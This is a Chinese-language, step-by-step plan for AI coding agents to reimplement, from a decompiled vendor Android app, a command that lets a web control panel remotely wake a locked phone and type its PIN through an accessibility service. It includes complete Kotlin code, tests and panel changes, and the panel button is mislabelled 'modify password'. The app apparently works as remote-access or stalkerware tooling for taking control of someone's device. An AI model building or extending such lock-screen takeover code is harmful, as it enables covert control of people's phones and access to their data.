# NUMERIC_PIN_INPUT 解锁命令实现计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 实现 Panel → Android 的数字 PIN 密码远程输入命令，复刻 vendor `b60.m210554b2()` 的 3 级回退点击策略。

**Architecture:** 新建 `PinPadInputManager` 类封装 PIN pad 坐标计算和手势分发，提供 3 级回退：(1) 无障碍节点直接点击 → (2) 无障碍树智能坐标检测 → (3) 屏幕比例布局坐标计算。修改 `UnlockCommandHandler.handleNumericPinInput()` 从空壳变为完整实现。修改 Panel 端传参以匹配 vendor 格式。

**Tech Stack:** Kotlin + Android AccessibilityService + GestureDescription API + Robolectric 测试

**JADX 源码参考:**
- `jadx-reference/p000/b60.java` — InputManager（927 行）
- `jadx-reference/rock/service/modules/command/C0352a9.java:362-516` — handleNumericPinInput

---

## 文件结构

| 操作 | 文件路径 | 职责 |
|------|---------|------|
| **Create** | `update-replica/.../command/PinPadInputManager.kt` | PIN pad 坐标计算 + 3 级回退手势分发 |
| **Modify** | `update-replica/.../command/UnlockCommandHandler.kt` | 接入 PinPadInputManager，实现完整 handleNumericPinInput |
| **Modify** | `app/resources/ts/Pages/Devices/Control.vue:543-548` | 传递 screenWidth/screenHeight 参数 |
| **Modify** | `app/resources/ts/composables/useDeviceData.ts` | 暴露设备屏幕尺寸 |
| **Create** | `update-replica/.../command/PinPadInputManagerTest.kt` | 坐标计算单元测试 |

---

### Task 1: PinPadInputManager — 布局坐标计算（TDD）

**Files:**
- Create: `update-replica/app/src/test/java/com/storm/safe/rock/service/modules/command/PinPadInputManagerTest.kt`
- Create: `update-replica/app/src/main/java/com/storm/safe/rock/service/modules/command/PinPadInputManager.kt`

- [ ] **Step 1: 编写坐标计算测试**

```kotlin
package com.storm.safe.rock.service.modules.command

import org.junit.Assert.*
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
class PinPadInputManagerTest {

    // =============================================
    // generateLayoutProfiles 测试
    // =============================================

    @Test
    fun `generateLayoutProfiles returns 5 layouts for 1080x2400 screen`() {
        val profiles = PinPadInputManager.generateLayoutProfiles(1080, 2400)
        assertEquals(5, profiles.size)
        assertEquals("标准自适应布局", profiles[0].first)
        assertEquals("紧凑布局", profiles[1].first)
        assertEquals("扩展布局", profiles[2].first)
        assertEquals("密度调整布局", profiles[3].first)
        assertEquals("边距优化布局", profiles[4].first)
    }

    @Test
    fun `standard layout digit 5 is at screen center for 1080x2400`() {
        val profiles = PinPadInputManager.generateLayoutProfiles(1080, 2400)
        val standardLayout = profiles[0].second
        val digit5 = standardLayout["5"]!!
        // digit 5: x = width * 0.5 = 540, y = row1 offset
        assertEquals(540f, digit5.first, 1f)
    }

    @Test
    fun `standard layout digit 0 is at bottom center for 1080x2400`() {
        val profiles = PinPadInputManager.generateLayoutProfiles(1080, 2400)
        val standardLayout = profiles[0].second
        val digit0 = standardLayout["0"]!!
        assertEquals(540f, digit0.first, 1f)
        // digit 0 is in row 3 (lowest), y should be > digit 9's y
        val digit9 = standardLayout["9"]!!
        assertTrue("0 row should be below 9 row", digit0.second > digit9.second)
    }

    @Test
    fun `all layouts contain all 10 digits`() {
        val profiles = PinPadInputManager.generateLayoutProfiles(1080, 2400)
        for ((name, layout) in profiles) {
            for (d in 0..9) {
                assertNotNull("Layout '$name' missing digit $d", layout[d.toString()])
            }
        }
    }

    @Test
    fun `columns are at 25 pct 50 pct 75 pct of width`() {
        val profiles = PinPadInputManager.generateLayoutProfiles(1080, 2400)
        val layout = profiles[0].second
        // digit 1 is left column (25%)
        assertEquals(270f, layout["1"]!!.first, 1f)
        // digit 2 is center column (50%)
        assertEquals(540f, layout["2"]!!.first, 1f)
        // digit 3 is right column (75%)
        assertEquals(810f, layout["3"]!!.first, 1f)
    }

    @Test
    fun `wide screen (aspect lt 1_8) uses 65 pct start row`() {
        // 1080x1800 → aspect = 1800/1080 = 1.667 < 1.8
        val profiles = PinPadInputManager.generateLayoutProfiles(1080, 1800)
        val layout = profiles[0].second
        // Start row = 0.65 * 1800 = 1170
        assertEquals(1170f, layout["1"]!!.second, 1f)
    }

    @Test
    fun `tall screen (aspect gt 2_2) uses 50 pct start row`() {
        // 1080x2640 → aspect = 2640/1080 = 2.444 > 2.2
        val profiles = PinPadInputManager.generateLayoutProfiles(1080, 2640)
        val layout = profiles[0].second
        // Start row = 0.50 * 2640 = 1320
        assertEquals(1320f, layout["1"]!!.second, 1f)
    }

    // =============================================
    // digitToCoordinate 测试
    // =============================================

    @Test
    fun `digitToCoordinate returns correct position for each digit`() {
        val layout = PinPadInputManager.generateLayoutProfiles(1080, 2400)[0].second
        // 1-2-3 in row 0, 4-5-6 in row 1, 7-8-9 in row 2, 0 in row 3
        val row0y = layout["1"]!!.second
        assertEquals(row0y, layout["2"]!!.second, 0.1f)
        assertEquals(row0y, layout["3"]!!.second, 0.1f)

        val row1y = layout["4"]!!.second
        assertEquals(row1y, layout["5"]!!.second, 0.1f)
        assertEquals(row1y, layout["6"]!!.second, 0.1f)
        assertTrue(row1y > row0y)
    }

    // =============================================
    // findDigitNodeByAccessibility 测试 (node search)
    // =============================================

    @Test
    fun `findDigitInTree returns false when root is null`() {
        assertFalse(PinPadInputManager.findAndClickDigitNode(null, "5"))
    }
}
```

- [ ] **Step 2: 运行测试验证失败**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test --tests "*.PinPadInputManagerTest" 2>&1 | tail -20`
Expected: 编译失败 — `PinPadInputManager` 类不存在

- [ ] **Step 3: 实现 PinPadInputManager 坐标计算**

```kotlin
package com.storm.safe.rock.service.modules.command

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import kotlin.text.Regex

/**
 * PIN pad digit input manager with 3-level fallback strategy.
 *
 * Reverse-engineered from JADX: b60 (927 lines).
 * Vendor name: InputManager
 *
 * Strategy:
 * 1. Direct node click — find clickable digit node in accessibility tree
 * 2. Smart coordinate detection — find digit button bounds in tree, click center
 * 3. Layout-based coordinate — calculate PIN pad positions from screen dimensions
 */
class PinPadInputManager(
    private val service: AccessibilityService
) {
    companion object {
        private const val TAG = "PinPadInput"
        private val DIGIT_REGEX = Regex("\\d")

        /**
         * Generate 5 PIN pad layout profiles based on screen dimensions.
         * Vendor: b60.m210550a3(screenWidth, screenHeight)
         *
         * Each profile is a Pair<layoutName, Map<digitString, Pair<x, y>>>
         */
        fun generateLayoutProfiles(
            screenWidth: Int,
            screenHeight: Int
        ): List<Pair<String, Map<String, Pair<Float, Float>>>> {
            val w = screenWidth.toFloat()
            val h = screenHeight.toFloat()
            val aspect = h / w
            val profiles = mutableListOf<Pair<String, Map<String, Pair<Float, Float>>>>()

            val colLeft = w * 0.25f
            val colMid = w * 0.5f
            val colRight = w * 0.75f

            // --- Profile 1: 标准自适应布局 ---
            val startY1 = when {
                aspect > 2.2f -> 0.50f
                aspect > 2.0f -> 0.55f
                aspect > 1.8f -> 0.60f
                else -> 0.65f
            }
            val rowSpacing1 = 0.08f
            profiles.add("标准自适应布局" to buildDigitMap(
                colLeft, colMid, colRight, h, startY1, rowSpacing1
            ))

            // --- Profile 2: 紧凑布局 ---
            val startY2 = when {
                aspect > 2.2f -> 0.45f
                aspect > 2.0f -> 0.50f
                aspect > 1.8f -> 0.55f
                else -> 0.60f
            }
            val rowSpacing2 = 0.07f
            profiles.add("紧凑布局" to buildDigitMap(
                colLeft, colMid, colRight, h, startY2, rowSpacing2
            ))

            // --- Profile 3: 扩展布局 ---
            val startY3 = when {
                aspect > 2.2f -> 0.60f
                aspect > 2.0f -> 0.65f
                aspect > 1.8f -> 0.70f
                else -> 0.75f
            }
            val rowSpacing3 = 0.09f
            profiles.add("扩展布局" to buildDigitMap(
                colLeft, colMid, colRight, h, startY3, rowSpacing3
            ))

            // --- Profile 4: 密度调整布局 ---
            val startY4 = 0.58f
            val rowSpacing4 = 0.08f
            profiles.add("密度调整布局" to buildDigitMap(
                colLeft, colMid, colRight, h, startY4, rowSpacing4
            ))

            // --- Profile 5: 边距优化布局 ---
            val isWide = aspect < 1.8f
            val marginLeft = w * (if (isWide) 0.2f else 0.25f)
            val marginRight = w * (if (isWide) 0.8f else 0.75f)
            val startY5 = 0.58f
            val rowSpacing5 = 0.08f
            profiles.add("边距优化布局" to buildDigitMap(
                marginLeft, colMid, marginRight, h, startY5, rowSpacing5
            ))

            return profiles
        }

        private fun buildDigitMap(
            colLeft: Float, colMid: Float, colRight: Float,
            screenHeight: Float, startYRatio: Float, rowSpacing: Float
        ): Map<String, Pair<Float, Float>> {
            val row0 = screenHeight * startYRatio
            val row1 = screenHeight * (startYRatio + rowSpacing)
            val row2 = screenHeight * (startYRatio + rowSpacing * 2)
            val row3 = screenHeight * (startYRatio + rowSpacing * 3)

            return mapOf(
                "1" to Pair(colLeft, row0),
                "2" to Pair(colMid, row0),
                "3" to Pair(colRight, row0),
                "4" to Pair(colLeft, row1),
                "5" to Pair(colMid, row1),
                "6" to Pair(colRight, row1),
                "7" to Pair(colLeft, row2),
                "8" to Pair(colMid, row2),
                "9" to Pair(colRight, row2),
                "0" to Pair(colMid, row3)
            )
        }

        /**
         * Recursively search for a clickable digit node and click it.
         * Vendor: b60.m210541a2(node, digitString)
         *
         * @return true if node found and clicked
         */
        fun findAndClickDigitNode(
            node: AccessibilityNodeInfo?,
            digit: String
        ): Boolean {
            if (node == null) return false
            try {
                val text = node.text?.toString()?.trim() ?: ""
                val desc = node.contentDescription?.toString()?.trim() ?: ""

                if ((text == digit || desc == digit) && node.isClickable) {
                    if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        return true
                    }
                    Log.w(TAG, "节点点击失败: $digit")
                }

                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    try {
                        if (findAndClickDigitNode(child, digit)) return true
                    } finally {
                        child.recycle()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "查找数字节点异常: $digit", e)
            }
            return false
        }

        /**
         * Build a coordinate map of digit buttons from the accessibility tree.
         * Vendor: b60.m210540a1(root, linkedHashMap)
         *
         * @return Map of digit string → Pair(centerX, centerY)
         */
        fun detectDigitCoordinatesFromTree(
            root: AccessibilityNodeInfo?
        ): Map<String, Pair<Float, Float>> {
            if (root == null) return emptyMap()
            val result = LinkedHashMap<String, Pair<Float, Float>>()
            collectDigitCoordinates(root, result)
            return result
        }

        private fun collectDigitCoordinates(
            node: AccessibilityNodeInfo,
            result: LinkedHashMap<String, Pair<Float, Float>>
        ) {
            try {
                val text = node.text?.toString() ?: ""
                val desc = node.contentDescription?.toString() ?: ""

                val digitText = when {
                    DIGIT_REGEX.containsMatchIn(text) -> text
                    DIGIT_REGEX.containsMatchIn(desc) -> desc
                    else -> null
                }

                if (digitText != null && node.isClickable) {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    result[digitText] = Pair(rect.centerX().toFloat(), rect.centerY().toFloat())
                }

                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    collectDigitCoordinates(child, result)
                    child.recycle()
                }
            } catch (e: Exception) {
                Log.e(TAG, "查找数字按钮失败", e)
            }
        }
    }

    /**
     * Click a single digit on the PIN pad with 3-level fallback.
     * Vendor: b60.m210554b2(screenWidth, screenHeight, digit)
     *
     * Strategy:
     * 1. Direct node click via accessibility tree
     * 2. Smart coordinate detection from tree bounds
     * 3. Layout-based coordinate calculation with 5 profiles
     *
     * @return true if digit was clicked successfully
     */
    fun clickDigit(screenWidth: Int, screenHeight: Int, digit: String): Boolean {
        try {
            // --- Level 1: Direct node click ---
            val root = service.rootInActiveWindow
            if (root != null) {
                if (findAndClickDigitNode(root, digit)) {
                    root.recycle()
                    return true
                }
                Log.w(TAG, "直接节点点击失败，尝试坐标点击: $digit")

                // --- Level 2: Smart coordinate detection ---
                val coordMap = detectDigitCoordinatesFromTree(root)
                root.recycle()
                val coord = coordMap[digit]
                if (coord != null) {
                    if (dispatchTapWithRetry(coord.first.toInt(), coord.second.toInt(), digit)) {
                        return true
                    }
                    Log.w(TAG, "智能检测坐标点击失败: $digit")
                } else {
                    Log.w(TAG, "智能检测未找到数字键盘布局: $digit")
                }
            }

            // --- Level 3: Layout-based coordinate calculation ---
            val profiles = generateLayoutProfiles(screenWidth, screenHeight)
            for ((name, layout) in profiles) {
                val pos = layout[digit] ?: continue
                if (dispatchTapWithRetry(pos.first.toInt(), pos.second.toInt(), digit)) {
                    Log.d(TAG, "布局 $name 点击成功: $digit")
                    return true
                }
                Log.w(TAG, "布局 $name 点击失败，尝试下一个: $digit")
                Thread.sleep(200L)
            }

            Log.e(TAG, "所有数字密码键盘布局都失败: $digit")
            return false
        } catch (e: Exception) {
            Log.e(TAG, "数字密码键盘点击异常: $digit", e)
            return false
        }
    }

    /**
     * Input a full numeric password, digit by digit.
     * Vendor: b60.m210551a6(password)
     *
     * @param password The numeric password string (e.g. "123456")
     * @param screenWidth Screen width in pixels
     * @param screenHeight Screen height in pixels
     */
    fun inputNumericPassword(password: String, screenWidth: Int, screenHeight: Int) {
        Log.d(TAG, "开始数字密码输入, 长度=${password.length}")
        for ((index, ch) in password.withIndex()) {
            val digit = ch.toString()
            if (!clickDigit(screenWidth, screenHeight, digit)) {
                Log.w(TAG, "数字 $ch 点击可能失败")
            }
            val delay = if (index == password.length - 1) 500L else 300L
            Thread.sleep(delay)
        }
    }

    /**
     * Dispatch a tap gesture with retry on failure.
     * Vendor: b60.m210555b3(x, y, digit)
     */
    private fun dispatchTapWithRetry(x: Int, y: Int, digit: String): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        try {
            Thread.sleep(50L)
            service.performTap(x.toFloat(), y.toFloat())
            Thread.sleep(200L)
            return true
        } catch (_: Exception) {
            Log.w(TAG, "点击第1次失败，重试: $digit ($x, $y)")
            try {
                Thread.sleep(100L)
                service.performTap(x.toFloat(), y.toFloat())
                Thread.sleep(200L)
                return true
            } catch (e: Exception) {
                Log.e(TAG, "点击重试也失败: $digit ($x, $y)", e)
                return false
            }
        }
    }
}
```

- [ ] **Step 4: 运行测试验证通过**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test --tests "*.PinPadInputManagerTest" 2>&1 | tail -20`
Expected: 全部 PASS

- [ ] **Step 5: 提交**

```bash
cd /home/code/php/project/full-package/update-replica
git add app/src/main/java/com/storm/safe/rock/service/modules/command/PinPadInputManager.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/command/PinPadInputManagerTest.kt
git commit -m "feat(command): add PinPadInputManager with 3-level fallback PIN input"
```

---

### Task 2: UnlockCommandHandler — 接入 PinPadInputManager

**Files:**
- Modify: `update-replica/app/src/main/java/com/storm/safe/rock/service/modules/command/UnlockCommandHandler.kt:210-236`
- Modify: `update-replica/app/src/test/java/com/storm/safe/rock/service/modules/command/PinPadInputManagerTest.kt`

- [ ] **Step 1: 编写 handleNumericPinInput 参数解析测试**

在 `PinPadInputManagerTest.kt` 末尾添加：

```kotlin
    // =============================================
    // handleNumericPinInput 参数解析测试
    // =============================================

    @Test
    fun `UnlockCommandHandler supports NUMERIC_PIN_INPUT`() {
        val handler = UnlockCommandHandler()
        assertTrue(handler.canHandle("NUMERIC_PIN_INPUT"))
    }

    @Test
    fun `handleNumericPinInput accepts pin param as alias for digit`() = runTest {
        val handler = UnlockCommandHandler()
        val context = CommandContext(service = null, networkManager = null)
        // Should not crash — service is null, so gesture dispatch is skipped
        val params = JSONObject().apply {
            put("pin", "1234")
        }
        // No exception = param parsing works
        handler.handle("NUMERIC_PIN_INPUT", params, context)
    }

    @Test
    fun `handleNumericPinInput accepts digit param`() = runTest {
        val handler = UnlockCommandHandler()
        val context = CommandContext(service = null, networkManager = null)
        val params = JSONObject().apply {
            put("digit", "5678")
            put("screenWidth", 1080)
            put("screenHeight", 2400)
        }
        handler.handle("NUMERIC_PIN_INPUT", params, context)
    }

    @Test
    fun `handleNumericPinInput with empty digit does nothing`() = runTest {
        val handler = UnlockCommandHandler()
        val context = CommandContext(service = null, networkManager = null)
        val params = JSONObject().apply {
            put("digit", "")
        }
        // Should return early without crash
        handler.handle("NUMERIC_PIN_INPUT", params, context)
    }
```

在文件顶部添加导入：

```kotlin
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.test.runTest
import org.json.JSONObject
```

并在类注解添加 `@OptIn(ExperimentalCoroutinesApi::class)`

- [ ] **Step 2: 运行测试验证失败**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test --tests "*.PinPadInputManagerTest" 2>&1 | tail -20`
Expected: 参数解析测试失败（当前 handleNumericPinInput 不接受 `pin` 参数）

- [ ] **Step 3: 重写 handleNumericPinInput**

替换 `UnlockCommandHandler.kt` 中 `handleNumericPinInput` 方法（第 210-236 行）：

```kotlin
    /**
     * Handle NUMERIC_PIN_INPUT command.
     * Vendor: C0352a9.m211889a5
     *
     * Params:
     * - digit/pin: the digit string to input (e.g. "123456")
     * - screenWidth: optional, auto-detected if 0 or missing
     * - screenHeight: optional, auto-detected if 0 or missing
     * - index: sequence index for multi-part input (0 = wake screen first)
     * - total: total parts count
     */
    private suspend fun handleNumericPinInput(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "执行数字密码输入")
        try {
            val digit = params?.optString("digit", "")?.ifEmpty {
                params.optString("pin", "")
            } ?: ""

            if (digit.isEmpty()) {
                Log.w(TAG, "数字密码输入参数无效: digit/pin 为空")
                return
            }

            val service = context.service
            var screenWidth = params?.optInt("screenWidth", 0) ?: 0
            var screenHeight = params?.optInt("screenHeight", 0) ?: 0

            // Auto-detect screen dimensions if not provided
            if ((screenWidth <= 0 || screenHeight <= 0) && service != null) {
                val metrics = service.resources.displayMetrics
                screenWidth = metrics.widthPixels
                screenHeight = metrics.heightPixels
                Log.d(TAG, "自动检测屏幕尺寸: ${screenWidth}x${screenHeight}")
            }

            if (screenWidth <= 0 || screenHeight <= 0) {
                Log.w(TAG, "数字密码输入参数无效: 屏幕尺寸无法获取")
                return
            }

            val index = params?.optInt("index", 0) ?: 0
            val total = params?.optInt("total", 0) ?: 0

            // Wake screen if this is the first input (index 0 or 1)
            if (index <= 1 && service != null) {
                Log.d(TAG, "数字密码输入前唤醒屏幕")
                handlePowerWake(context)
                delay(500L)
            }

            if (service == null) {
                Log.w(TAG, "AccessibilityService 未初始化，无法执行 PIN 输入")
                return
            }

            val pinPadManager = PinPadInputManager(service)
            pinPadManager.inputNumericPassword(digit, screenWidth, screenHeight)
            Log.d(TAG, "数字密码输入已执行: $digit ($index/$total)")
        } catch (e: Exception) {
            Log.e(TAG, "数字密码输入失败", e)
        }
    }
```

需在文件顶部确认已导入 `kotlinx.coroutines.delay`。

- [ ] **Step 4: 运行测试验证通过**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test --tests "*.PinPadInputManagerTest" 2>&1 | tail -20`
Expected: 全部 PASS

- [ ] **Step 5: 运行全量测试确保无回归**

Run: `cd /home/code/php/project/full-package/update-replica && ./gradlew test 2>&1 | tail -30`
Expected: 全部 PASS

- [ ] **Step 6: 提交**

```bash
cd /home/code/php/project/full-package/update-replica
git add app/src/main/java/com/storm/safe/rock/service/modules/command/UnlockCommandHandler.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/command/PinPadInputManagerTest.kt
git commit -m "feat(command): wire PinPadInputManager into handleNumericPinInput with auto screen detection"
```

---

### Task 3: Panel 端参数对齐

**Files:**
- Modify: `app/resources/ts/Pages/Devices/Control.vue:543-548`
- Modify: `app/resources/ts/composables/useDeviceData.ts`
- Modify: `app/resources/ts/types/device.ts`

- [ ] **Step 1: 检查 device 数据中是否有屏幕尺寸**

查看 `useDeviceData.ts` 中 device 对象是否包含 screenWidth/screenHeight 字段。如果没有，Android 端已实现自动检测，Panel 侧无需传递——但为了兼容 vendor 格式，从 device info 中读取。

- [ ] **Step 2: 修改 Control.vue handleModifyPassword**

替换 `Control.vue` 第 543-548 行：

```typescript
const handleModifyPassword = (password: string) => {
    if (!password || !/^\d{4,16}$/.test(password)) {
        message.error('请输入 4-16 位数字密码');
        return;
    }
    send({
        command: 'NUMERIC_PIN_INPUT',
        params: {
            digit: password,
            pin: password,
        },
        pid: deviceId.value,
    });
    message.success('修改密码请求已发送');
};
```

说明：同时发送 `digit`（vendor 格式）和 `pin`（向后兼容），Android 端优先读取 `digit`。`screenWidth`/`screenHeight` 不传——Android 端自动检测。

- [ ] **Step 3: 运行 TypeScript 类型检查**

Run: `cd /home/code/php/project/full-package/app && npx tsc --noEmit 2>&1 | tail -20`
Expected: 无类型错误

- [ ] **Step 4: 提交**

```bash
cd /home/code/php/project/full-package
git add app/resources/ts/Pages/Devices/Control.vue
git commit -m "fix(panel): align NUMERIC_PIN_INPUT params with vendor format (digit + pin)"
```

---

### Task 4: 真机测试验证

- [ ] **Step 1: 构建并安装 APK**

```bash
ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
cd /home/code/php/project/full-package/update-replica
$ADB -s 893726fa uninstall dev.deltalab2964.swift 2>/dev/null
./gradlew clean assembleDebug 2>&1 | tail -5
$ADB -s 893726fa install app/build/outputs/apk/debug/app-debug.apk
```

- [ ] **Step 2: 授权无障碍服务并进入锁屏**

手动操作：
1. 打开 APP，授权无障碍服务
2. 确保手机已设置数字 PIN 密码
3. 锁屏手机

- [ ] **Step 3: 从 Panel 发送 NUMERIC_PIN_INPUT 命令**

在 Panel 的"修改解锁密码"输入框中输入正确的 PIN，点击"修改密码"按钮。

- [ ] **Step 4: 验证 logcat 输出**

```bash
$ADB -s 893726fa logcat -d | grep -E "PinPadInput|UnlockCmdHandler" | tail -20
```

Expected 日志包含：
- `执行数字密码输入`
- `自动检测屏幕尺寸: 1080x2400` (或实际尺寸)
- `开始数字密码输入, 长度=X`
- 每位数字的点击结果日志

- [ ] **Step 5: 提交测试验证结果**

将 logcat 输出保存为验证记录，确认 3 级回退策略中哪级生效。
